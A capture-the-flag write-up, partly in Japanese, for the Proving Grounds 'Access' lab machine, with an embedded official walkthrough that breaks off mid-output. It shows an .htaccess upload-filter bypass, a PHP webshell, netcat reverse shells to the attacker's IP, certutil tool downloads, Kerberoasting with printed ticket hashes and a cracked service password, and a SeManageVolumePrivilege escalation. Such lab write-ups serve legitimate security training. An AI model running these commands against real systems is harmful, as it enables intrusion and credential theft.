---
title: Access
parent: Proving Grounds Practice
grand_parent: Writeups
nav_order:
---
# Machine
## OS
## Level

---
# Reconnaissance
```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Access]
└─$ sudo nmap -Pn -p- -sS -oN open-port_scan.txt --open 192.168.129.187
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-09 10:05 +0900
Nmap scan report for 192.168.129.187
Host is up (0.078s latency).
Not shown: 65449 closed tcp ports (reset), 59 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49674/tcp open  unknown
49679/tcp open  unknown
49701/tcp open  unknown
49785/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 35.48 seconds
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Access]
└─$ sudo nmap -Pn -p80,389,443,445, -sSCV -A -oN full_tcp-scan.txt --open 192.168.129.187
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-09 10:07 +0900
Nmap scan report for 192.168.129.187
Host is up (0.079s latency).

PORT    STATE SERVICE       VERSION
80/tcp  open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
|_http-title: Access The Event
| http-methods: 
|_  Potentially risky methods: TRACE
389/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec, Site: Default-First-Site-Name)
443/tcp open  ssl/http      Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
| http-methods: 
|_  Potentially risky methods: TRACE
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-title: Access The Event
445/tcp open  microsoft-ds?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10|11|2012|2022|2016 (95%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2019 (95%), Microsoft Windows 10 1909 - 2004 (94%), Microsoft Windows 10 1709 - 22H2 (92%), Microsoft Windows 10 1909 (90%), Microsoft Windows 11 24H2 - 25H2 (89%), Microsoft Windows Server 2012 R2 (89%), Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2016 (88%), Microsoft Windows 10 21H2 (87%), Microsoft Windows Server 2012 Data Center (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-06-09T01:08:18
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   79.01 ms 192.168.45.1
2   78.91 ms 192.168.45.254
3   79.03 ms 192.168.251.1
4   79.09 ms 192.168.129.187

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.77 seconds
                                                                  
```

# http

http://192.168.129.187/

![](../../../assets/images/Pasted%20image%2020260609101734.png)

![](../../../assets/images/Pasted%20image%2020260609101823.png)

cmd.aspx upload

![](../../../assets/images/Pasted%20image%2020260609101920.png)

![](../../../assets/images/Pasted%20image%2020260609102001.png)

*aspxにアクセスしても実行されなかったためphpに変更*

![](../../../assets/images/Pasted%20image%2020260609102241.png)

![](../../../assets/images/Pasted%20image%2020260609102333.png)



.htaccessの作成
```
AddType application/x-httpd-php .evil
```
.evilをphpとして解釈させる

![](../../assets/images/Pasted%20image%2020260609115259.png)

Upload
![](../../../assets/images/Pasted%20image%2020260609120224.png)

![](../../../assets/images/Pasted%20image%2020260609120233.png)

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Access]
└─$ cp simple-backdoor.php simple-backdoor.php.evil
```

[http://192.168.129.187/uploads/simple-backdoor.php.evil](http://192.168.129.187/uploads/simple-backdoor.php.evil?cmd=whoami)

https://www.revshells.com/

![](../../../assets/images/Pasted%20image%2020260609120249.png)

---

# Initial Access

![](../../../assets/images/Pasted%20image%2020260610023910.png)

![](../../../assets/images/Pasted%20image%2020260610024020.png)

http://192.168.215.187/uploads/revshell.php.evil

![](../../../assets/images/Pasted%20image%2020260610024113.png)

# Enum

## .env
```zsh
c:\Users\svc_apache\Documents>set
ALLUSERSPROFILE=C:\ProgramData
APPDATA=C:\Users\svc_apache\AppData\Roaming
CommonProgramFiles=C:\Program Files\Common Files
CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
CommonProgramW6432=C:\Program Files\Common Files
COMPUTERNAME=SERVER
ComSpec=C:\Windows\system32\cmd.exe
DriverData=C:\Windows\System32\Drivers\DriverData
LOCALAPPDATA=C:\Users\svc_apache\AppData\Local
NUMBER_OF_PROCESSORS=2
OS=Windows_NT
Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\svc_apache\AppData\Local\Microsoft\WindowsApps
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
PROCESSOR_ARCHITECTURE=AMD64
PROCESSOR_IDENTIFIER=AMD64 Family 25 Model 1 Stepping 1, AuthenticAMD
PROCESSOR_LEVEL=25
PROCESSOR_REVISION=0101
ProgramData=C:\ProgramData
ProgramFiles=C:\Program Files
ProgramFiles(x86)=C:\Program Files (x86)
ProgramW6432=C:\Program Files
PROMPT=$P$G
PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
PUBLIC=C:\Users\Public
SystemDrive=C:
SystemRoot=C:\Windows
TEMP=C:\Users\SVC_AP~1\AppData\Local\Temp
TMP=C:\Users\SVC_AP~1\AppData\Local\Temp
USERDNSDOMAIN=ACCESS.OFFSEC
USERDOMAIN=ACCESS
USERNAME=svc_apache
USERPROFILE=C:\Users\svc_apache
windir=C:\Windows
AP_PARENT_PID=3400
```

```zsh
c:\Users\svc_apache\Documents>.\winPEASx64.exe
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Access]
└─$ cp /usr/share/windows-resources/rubeus/Rubeus.exe . 
```

```zsh
c:\Users\svc_apache\Documents>.\Rubeus.exe kerberoast /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4 


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Searching the current domain for Kerberoastable users

[*] Total kerberoastable users : 1


[*] SamAccountName         : svc_mssql
[*] DistinguishedName      : CN=MSSQL,CN=Users,DC=access,DC=offsec
[*] ServicePrincipalName   : MSSQLSvc/DC.access.offsec
[*] PwdLastSet             : 5/21/2022 12:33:45 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec*$914327B72ECF911B43A84FF2D10AC30B$2202DB63188A7A3DC9B420265C33A65C52A7E982D559255011C12AD4D318B87A0B4CD0F642657A5F5411B018ADBD12829BC079696D47342E522F90F4828665027CFBE59945AA2D83612FBF447A24EFB046ED6D29626DAB2009193ADFAA059C65D33C0CED48FF7A45582913B974CF8F04569108DB1FD80D8F215482E9E1D977BD2195FBA84D8EA67C535763E8F506BDF808F320DE72E983B2E5E537BE3C6B6002343B4740BC3737EECC8A7E7532F269BCAF9224382BDC72B01095AFBB0052E5B4ADBD1F6463B24E7C673D094AD6E346D8462F121FFEB32935AD662BE2BBDE54A16157DA9E8DFC2FF0795F2CA3BBC7B25EAECF95ED5321EEAAD227148F21E746618186526DB4ABA2A3CBD3D971FE42E55C7384EB55DF70A5EF67AD215CA92F28ACAEA3EB15784C4CF283E1B4B14101E53EE16EF234641C5CE76427225410F9AB41BCCDDAA2F79020DE7CFD4C3BBDA759D21142A02C3FB4BA44A896953891941707AA1FD9EC504CB551C9A41CDFD47055AC10BFF8D14B7B6B1F2BBE6CCC94A13FE2FFA30414A5F640FD1369721329A41DF7C4ED2641985CA059553FD8AE4E955FFF94E1242449343058DF324E15721FC6C214F858F553121B7CDFC3070D06D2DCB18B0DCB6E3D42F7FD55775DF1B1A4C4EBB50A41ACE16F7BBDD1025E4E02DB7286E1D1E61DB9D7A4D960A12A62DB8578EC903EFD7953979E187AC7D355950278501CAE2F0ACE6061EAA3D8CC58E7F19FAF503DFF17380469E1DF8B9BE4D3A4EAB4983B57B7D7BF025BEA1A729BACE329B1A6E4B2FF2DD84337AAE81AABBED233710879B4A7EF224F4236B4681146C8C6E59D775A2DC4E367D486196DFDC0DCFB6D799CB431FD548B2CC2584DF770D44729D665DF0CAC28DE8AC501DBEF3F74168A9C0DDBDF13A7DD600E9C42DEAB2B3B4D7F27CA7A9DFB354518FAEF72D1F85780E72E93FD724D0DBE9F8C870638B0865359898C0618A50E2ACE4B4691839D1D6B79F23E3AF33E5920E77AB1875A47ED76FE23D3E49ADAD3F8251F0B1DB70067F1BB000F71D96E54B6B3E933F880D26A287C6E48AE87EFE33189BBAA8E389B55783B5EA1DE7501C1473F980ED7FE7F8A42011D586BF3067B69D34DC56D9E8D2C4CBF7EBC735729BC493A043912640F7A61B5ABCB655EFC1185BAB9A8A704A57DED6B8B503966B0701AFB5316F66D7B8A0C982CF82C6FBE3939DE0B5352578A810CA7E735AB285C7E6DF8F4CA8592422CE4F132FEA770E46A5197EF06B155376A1AA394AE46822995339E994A436823DE1A018A4339FEC9E14455C4766DF7FE17B1301ECB191A0889469DD1F684D9D9FD4C4F67974EDE667856A43B43CA2B12566D7040593E41C08BC7B288B4FEE8437E27A445C7A9067099AB29B6EA5B113DD7F84B59E512C8027476011663F7EACE241F6702B85F0559EAFBF02596C67FB3C4F2A7BA0C38C06CDCAC67A9ACDF61FD2FA38B77507CECA22968BAAC6EC66D00D9E47643F03F5DF3A77927D43C7A833A5899A68C5D930DC07FF5DE03AFAE6AF31D822296B7DFEF6AE0EFEE6AFC6626E096F3DF182A14598B75A246CF8186272FDD988B3806500F6870FC1EC1B02F472FBBA6FA57
```

https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1

```powershell
PS C:\certutil -urlcache -f http://192.168.45.212/Invoke-RunasCs.ps1 Invoke-RunasCs.ps1
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

```powershell
PS C:\Users\svc_apache\Documents> import-module .\Invoke-RunasCs.ps1
```

```powershell
PS C:\Users\svc_apache\Documents> . .\Invoke-RunasCs.ps1
```

```powershell
PS C:\Users\svc_apache\Documents> Get-Command Invoke-RunasCs

CommandType     Name                                               Version    Source                                   
-----------     ----                                               -------    ------                                   
Function        Invoke-RunasCs                                              
```

```powershell
PS C:\Users\svc_apache\Documents> Get-ExecutionPolicy
Bypass

PS C:\Users\svc_apache\Documents> Invoke-RunasCs svc_mssql trustno1 whoami
[*] Warning: The logon for user 'svc_mssql' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

access\svc_mssql
```

```zsh
PS C:\xampp\htdocs\uploads> invoke-runascs svc_mssql trustno1 "whoami /priv"
[*] Warning: The logon for user 'svc_mssql' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                      State   
============================= ================================ ========
SeMachineAccountPrivilege     Add workstations to domain       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled 
SeManageVolumePrivilege       Perform volume maintenance tasks Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Disabled
```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```
---

# Privilege Escalation

```zsh

```

<details markdown="1">
<summary>Walkthrough</summary>

```zsh
Walkthrough
Close
Exploitation Guide for Access
Summary
In this guide, we'll leverage a file upload function on a web application to upload a php webshell and gain a foothold. We will then escalate to svc_myql and abuse SeManageVolumePrivilege to gain system access on the target.

Enumeration
Nmap
We begin with an nmap scan.

┌──(kali㉿kali)-[~]
└─$ nmap 192.168.120.107 -p- -Pn 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-11 07:32 EDT
Nmap scan report for 192.168.120.107
Host is up (0.24s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5357/tcp  open  wsdapi
5985/tcp  open  wsman
9389/tcp  open  adws
49666/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49697/tcp open  unknown
49747/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 433.59 seconds
According to nmap, a webserver is operating on port 80. When we go to the website, we are presented to an Event page, which includes speakers, timetables, events, a gallery, and the ability to purchase tickets. The option to buy tickets includes a functionality to upload images.

Exploitation
The purchase tickets upload function prevents users from submitting files with extensions that allow php code execution such as:

[ .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .phar and .inc ]
We notice that users can upload .htaccess files. We can take advantage of this to get code execution. More information can be found here.

The .htaccess file is not an RCE vector by itself, but it allows the creation of new legitimate PHP extensions that are allowed by the web application.

Exploiting .htaccess to get RCE
We create our new .htaccess file which includes a new allowed extension of .evil.

┌──(kali㉿kali)-[~]
└─$ cat .htaccess 
AddType application/x-httpd-php .evil
We then upload it to the target using the "Upload Image" form in the "Buy Tickets" function of the website.

We will also need a PHP webshell. Let's use wwwolf-php-webshell, and change the extension to .evil before uploading it using the same method as before.

We now need to figure out where it was uploaded to. Let's use Gobuster to find out where the files are being uploaded.

┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.120.107 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.120.107
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/11 07:33:16 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 344] [--> http://192.168.120.107/uploads/]
/assets               (Status: 301) [Size: 343] [--> http://192.168.120.107/assets/] 
/forms                (Status: 301) [Size: 342] [--> http://192.168.120.107/forms/] 
The uploads directory looks promising. Command execution can be achieved by accessing the uploaded file available at http://192.168.120.107/uploads/webshell.evil

Using the webshell, we can upload nc.exe and use it to connect back to a netcat listener .

Let's start our listener.

┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
Then, execute nc.exe from the webshell.

.\nc.exe 192.168.36.128 9001 -e cmd.exe
We then receive the connection on our listener.

connect to [192.168.118.23] from (UNKNOWN) [192.168.120.107] 49884
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\uploads>whoami && hostname 
whoami && hostname 
access\svc_apache
SERVER

C:\xampp\htdocs\uploads>
We have achieved shell access on the target system. For ease, let's start powershell and begin local enumeration.

C:\xampp\htdocs\uploads>powershell 
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\xampp\htdocs\uploads>
Privilege Escalation to svc_mssql
Exploring the target, we notice a user named svc_mssql while enumerating users.

PS C:\xampp\htdocs\uploads> net users
net users

User accounts for \\SERVER

-------------------------------------------------------------------------------
Administrator            Guest                    krbtgt                   
svc_apache               svc_mssql                
The command completed successfully.
Let's utilize PowerView to find out more about the svc_mssql user. Using the webshell from before, we can upload the PowerView.ps1 script to the target and execute it.

PS C:\xampp\htdocs\uploads> import-module .\PowerView.ps1
import-module .\PowerView.ps1
PS C:\xampp\htdocs\uploads> Get-netuser svc_mssql
Get-netuser svc_mssql


company               : Access
logoncount            : 1
badpasswordtime       : 12/31/1600 4:00:00 PM
distinguishedname     : CN=MSSQL,CN=Users,DC=access,DC=offsec
objectclass           : {top, person, organizationalPerson, user}
lastlogontimestamp    : 4/8/2022 2:40:02 AM
name                  : MSSQL
objectsid             : S-1-5-21-537427935-490066102-1511301751-1104
samaccountname        : svc_mssql
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 4/8/2022 9:40:02 AM
instancetype          : 4
usncreated            : 16414
objectguid            : 05153e48-7b4b-4182-a6fe-22b6ff95c1a9
lastlogoff            : 12/31/1600 4:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=access,DC=offsec
dscorepropagationdata : 1/1/1601 12:00:00 AM
serviceprincipalname  : MSSQLSvc/DC.access.offsec
givenname             : MSSQL
lastlogon             : 4/8/2022 2:40:02 AM
badpwdcount           : 0
cn                    : MSSQL
useraccountcontrol    : NORMAL_ACCOUNT
whencreated           : 4/8/2022 9:39:43 AM
primarygroupid        : 513
pwdlastset            : 4/8/2022 2:39:43 AM
usnchanged            : 16420
We can see that this account is configured with a "serviceprincipalname" or SPN. Armed with this information, we can perform a kerberoasting attack.

Kerberoasting
We'll use Rubeus to acquire the the TGS of the user svc_mssql and then use hashcat or JohnTheRipper to crack the hash.

A compiled version of Rubeus.exe can be found at https://github.com/r3motecontrol/Ghostpack-CompiledBinaries. Let's download this executable and upload it to the target using our webshell. We can then execute it and obtain the hash for the service account.

PS C:\xampp\htdocs\uploads> ./Rubeus.exe kerberoast /nowrap
./Rubeus.exe kerberoast /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0 

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : access.offsec
[*] Searching path 'LDAP://SERVER.access.offsec/DC=access,DC=offsec' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1

[*] SamAccountName         : svc_mssql
[*] DistinguishedName      : CN=MSSQL,CN=Users,DC=access,DC=offsec
[*] ServicePrincipalName   : MSSQLSvc/DC.access.offsec
[*] PwdLastSet             : 10/10/2021 6:29:22 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec@access.offsec*$3C74878DC5D1C84A5CE29B54F565D711$85015D3D2D4FF03408D8758660BACEA9B51AD52F7C778016DFAA9E21E2FB0051BCEC910F28DF19CAE394160B6172896D41D04FF2ABED95A17B02A5828A0941E010B6E8F46EE7F296E36696C97F5E5B9FF49477FBAC137543C14584EE1E0C3F813970C1EDD2FF2A1121FBB6090D3A5D7F2DFABBDB24AD146C21430A9C0E786CB00FA9415A48864EF13BCE070113494C8B1AD95960B675ECB160DC04BCAEE9037A41FEE6D872F1E10EF5E9811621D03067B6AF566833F11405478E37275C27ED1391B561F2887CF86AAE5FAFE1FFB9A179B6E4B2EE579B08E9294E47434EECBF2CFD79E88687F4B1A92A9184401B3608A28100BF6870C6AC15BDE1DA93EAB61F8271C0C560E42B0EAB3C64C7E5604064E4A7AF5241DB5BE3216F4573BAC763A8443A637384BF2C56A23FAC6A45729A3A4A4467127DE954EAC38722A2B7257DFBA85EE26D4DCF68C372CA1CE1ABA9B6A35336883CDBE86BBCF9A8ED291C677D9F89681D5B720FD1A367E7D7D581949209ECDCA1834973653618052F1768353DEF396EC98B109FA6BC5F42FD3EB6B75CC7A33344CDBD5F21E995DC4EF9160BE8EA5E78EC1EE09ECE05A430416ABDCAB727811F5406E4FDBED62B0DA250F0DBB3DF7CFE7CB8302161CB86F8FD65E5505C01DF08E3F878D3706F5DC229489B8C3D6FA7358A9AD226A52E7582EE0131E3F814DE64AC3CB9CDC2FDAD93C6F6EDED631353CB2B7D87AD198FF56A3340798252726FCC4D6C741B41562216AB67332CFF28F34D71DA85D8045154AFBEA8BCEA3B2ED85E379207A7D772249E7F1B81BFD3DF9D2A1BE9E3BB6BA19C4536BEDFA3044F443EA26A8C755C1F5A17479E749E0D6D78A813207B49EFFEDEE2E023CE672A0121C8D9A273CF61620587F90CE65C364684186A5B9FB3C53BAEF50149AAAF0071A5672D4B81E522CAF033FE5E1BCE62280285828262DD8E169F20B38E500E5E7C63688E99CA124B8B01A40A0AFAD7537EB26BFFDD07ED239E9C852F71D8D21014ACAFABBF627A2983A35C08387202AD8A7177A916EA7931A9E6587DC214F4336A7450B2EEBF82E9462C05D46F40023352E8D41B4CB22566FF4902B24114D8983D64C232BBEEECB51FE943D1D755CF64ADD8422A8070EC1C1C5BE0872C31477B0D77467A7F09BF4DB1FFDBEC38E8EA70048F5CC4F45536AE5FEF1B228BC58C4EE2788DF217521EFB95A5B7F9E070A2E81E717E34B8F29EF7056FEBE6EB3800211F5CA909F17F8000B9C9873753BCE7326471D14D1349F54176F47F720F955EC85033D0260B57E9D10BBAA5FD9A1A9F39D1D8FE5E71ADC6788878A730DDBA83C688C69E949B067C9F1D7E6867E2E9E0B6E230BF63B0EB6FE0A49026482F97AFB6FAE88FECCCBB332101F8B842221069BF57B8A62436C230CB93C403BD45124F9BDF98BA07A635EC4A9BE321B5264B57DD546EF10344D5CA544CA1566FA2F6584A767BF349
We can copy this hash to a file named svc_mssql_hash.

┌──(kali㉿kali)-[~]
└─$ cat svc_mssql_hash 
$krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec@access.offsec*$3C74878DC5D1C84A5CE29B54F565D711$85015D3D2D4FF03408D8758660BACEA9B51AD52F7C778016DFAA9E21E2FB0051BCEC910F28DF19CAE394160B6172896D41D04FF2ABED95A17B02A5828A0941E010B6E8F46EE7F296E36696C97F5E5B9FF49477FBAC137543C14584EE1E0C3F813970C1EDD2FF2A1121FBB6090D3A5D7F2DFABBDB24AD146C21430A9C0E786CB00FA9415A48864EF13BCE070113494C8B1AD95960B675ECB160DC04BCAEE9037A41FEE6D872F1E10EF5E9811621D03067B6AF566833F11405478E37275C27ED1391B561F2887CF86AAE5FAFE1FFB9A179B6E4B2EE579B08E9294E47434EECBF2CFD79E88687F4B1A92A9184401B3608A28100BF6870C6AC15BDE1DA93EAB61F8271C0C560E42B0EAB3C64C7E5604064E4A7AF5241DB5BE3216F4573BAC763A8443A637384BF2C56A23FAC6A45729A3A4A4467127DE954EAC38722A2B7257DFBA85EE26D4DCF68C372CA1CE1ABA9B6A35336883CDBE86BBCF9A8ED291C677D9F89681D5B720FD1A367E7D7D581949209ECDCA1834973653618052F1768353DEF396EC98B109FA6BC5F42FD3EB6B75CC7A33344CDBD5F21E995DC4EF9160BE8EA5E78EC1EE09ECE05A430416ABDCAB727811F5406E4FDBED62B0DA250F0DBB3DF7CFE7CB8302161CB86F8FD65E5505C01DF08E3F878D3706F5DC229489B8C3D6FA7358A9AD226A52E7582EE0131E3F814DE64AC3CB9CDC2FDAD93C6F6EDED631353CB2B7D87AD198FF56A3340798252726FCC4D6C741B41562216AB67332CFF28F34D71DA85D8045154AFBEA8BCEA3B2ED85E379207A7D772249E7F1B81BFD3DF9D2A1BE9E3BB6BA19C4536BEDFA3044F443EA26A8C755C1F5A17479E749E0D6D78A813207B49EFFEDEE2E023CE672A0121C8D9A273CF61620587F90CE65C364684186A5B9FB3C53BAEF50149AAAF0071A5672D4B81E522CAF033FE5E1BCE62280285828262DD8E169F20B38E500E5E7C63688E99CA124B8B01A40A0AFAD7537EB26BFFDD07ED239E9C852F71D8D21014ACAFABBF627A2983A35C08387202AD8A7177A916EA7931A9E6587DC214F4336A7450B2EEBF82E9462C05D46F40023352E8D41B4CB22566FF4902B24114D8983D64C232BBEEECB51FE943D1D755CF64ADD8422A8070EC1C1C5BE0872C31477B0D77467A7F09BF4DB1FFDBEC38E8EA70048F5CC4F45536AE5FEF1B228BC58C4EE2788DF217521EFB95A5B7F9E070A2E81E717E34B8F29EF7056FEBE6EB3800211F5CA909F17F8000B9C9873753BCE7326471D14D1349F54176F47F720F955EC85033D0260B57E9D10BBAA5FD9A1A9F39D1D8FE5E71ADC6788878A730DDBA83C688C69E949B067C9F1D7E6867E2E9E0B6E230BF63B0EB6FE0A49026482F97AFB6FAE88FECCCBB332101F8B842221069BF57B8A62436C230CB93C403BD45124F9BDF98BA07A635EC4A9BE321B5264B57DD546EF10344D5CA544CA1566FA2F6584A767BF349
Using JohnTheRipper and the /usr/share/wordlists/rockyou.txt wordlist, we discover that password for svc_mssql is trustno1.

┌──(kali㉿kali)-[~/Desktop/PG-Practice]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt svc_mssql_hash 
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
trustno1         (?)     
1g 0:00:00:00 DONE (2022-04-11 09:20) 100.0g/s 102400p/s 102400c/s 102400C/s 123456..bethany
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
Next we will use RunAsCs to get shell as svc_mssql on the target. Let's grab a copy of Invoke-RunasCs.ps1 from the repository and upload it to the target by using the webshell.

In our shell on the target system, let's import the Invoke-RunasCs finction and then test it by running whoami.

PS C:\xampp\htdocs\uploads> import-module .\Invoke-RunasCs.ps1
import-module .\Invoke-RunasCs.ps1
PS C:\xampp\htdocs\uploads> Invoke-RunasCs svc_mssql trustno1 whoami
Invoke-RunasCs svc_mssql trustno1 whoami
access\svc_mssql

PS C:\xampp\htdocs\uploads> 
Then, we start netcat on the our kali machine and use Invoke-RunasCs to execute nc.exe on the target to initiate a reverse shell connection.

PS C:\xampp\htdocs\uploads> Invoke-RunasCs svc_mssql trustno1 'c:/xampp/htdocs/uploads/nc.exe 192.168.118.23 4444 -e cmd.exe'
We should then recieve a connection to our listener.

┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.118.23] from (UNKNOWN) [192.168.120.107] 49954
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami && hostname
whoami && hostname
access\svc_mssql
SERVER
We have successfully compromised the svc_mssql account!

Escalation
Enumeration privleges, we discover that SeManageVolumePrivilege is assigned to the svc_mssql account. We can take advantage of this privilege to get Administrator access to the target.

C:\Users\svc_mssql\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                      State   
============================= ================================ ========
SeMachineAccountPrivilege     Add workstations to domain       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled 
SeManageVolumePrivilege       Perform volume maintenance tasks Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Disabled
Reference :

https://twitter.com/0gtweet/status/1303432729854439425
https://github.com/CsEnox/SeManageVolumeExploit
Exploiting SeManageVolumePrivilege
According to this github repository:

This exploit grants full permission on C:\ drive for all users on the machine.

-   Enables the privilege in the token
-   Creates handle to \.\C: with SYNCHRONIZE | FILE_TRAVERSE
-   Sends the FSCTL_SD_GLOBAL_CHANGE to replace S-1-5-32-544 with S-1-5-32-545
Let's grab the compiled executable from the releases page.

We upload SeManageVolumeExploit.exe to the target and execute it. After execution, we discover that the Builtin Users group has full permissions on the Windows folder.

C:\xampp\htdocs\uploads>whoami
access\svc_mssql

C:\xampp\htdocs\uploads>SeManageVolumeExploit.exe
Entries changed: 865
DONE 

C:\xampp\htdocs\uploads>icacls C:/Windows
C:/Windows NT SERVICE\TrustedInstaller:(F)
           NT SERVICE\TrustedInstaller:(CI)(IO)(F)
           NT AUTHORITY\SYSTEM:(M)
           NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
